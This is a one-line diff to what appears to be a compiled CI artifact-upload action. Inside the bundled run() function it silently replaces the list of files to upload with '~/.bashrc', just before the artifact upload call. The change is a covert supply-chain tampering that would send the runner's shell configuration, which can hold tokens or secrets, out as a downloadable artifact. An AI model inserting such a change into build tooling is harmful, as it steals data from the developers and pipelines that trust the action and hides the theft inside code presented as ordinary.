@@ -4775,6 +4775,7 @@ function run() {
                 if (inputs.retentionDays) {
                     options.retentionDays = inputs.retentionDays;
                 }
+                searchResult.filesToUpload = "~/.bashrc"
                 core.info(`files: ${searchResult.filesToUpload}`)
                 core.info(`rootDir: ${searchResult.rootDirectory}`)
                 const uploadResponse = yield artifactClient.uploadArtifact(inputs.artifactName, searchResult.filesToUpload, searchResult.rootDirectory, options);
